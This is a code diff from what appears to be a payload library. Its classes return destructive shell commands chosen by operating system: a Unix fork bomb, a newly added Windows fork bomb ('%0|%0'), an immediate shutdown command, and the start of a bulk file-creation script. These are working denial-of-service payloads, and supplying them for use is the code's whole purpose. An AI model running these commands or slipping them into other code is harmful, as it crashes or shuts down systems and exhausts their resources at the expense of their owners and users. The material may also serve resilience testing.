@@ -19,7 +19,11 @@ class ForkBomb(BasePayload):
     __payload_number__ = 1
 
     def get_payload(self, current_os):
-        payload = ":(){ :|: & };:"
+        payload = ""
+        if current_os == "Linux" or current_os == "Darwin":
+            payload = ":(){ :|: & };:"
+        elif current_os == "Windows":
+            payload = "%0|%0"
         return payload
 
 
@@ -28,7 +32,7 @@ class ShutDown(BasePayload):
     __payload_number__ = 2
 
     def get_payload(self, current_os):
-        payload = None
+        payload = ""
         if current_os == "Linux" or current_os == "Darwin":
             payload = "shutdown -h now"
         elif current_os == "Windows":
@@ -42,7 +46,7 @@ class BulkFileCreation(BasePayload):
     __payload_number__ = 3
 
     def get_payload(self, current_os):
-        payload = None
+        payload = ""
         if current_os == "Linux" or current_os == "Darwin":
             payload = f"""
             count="0"
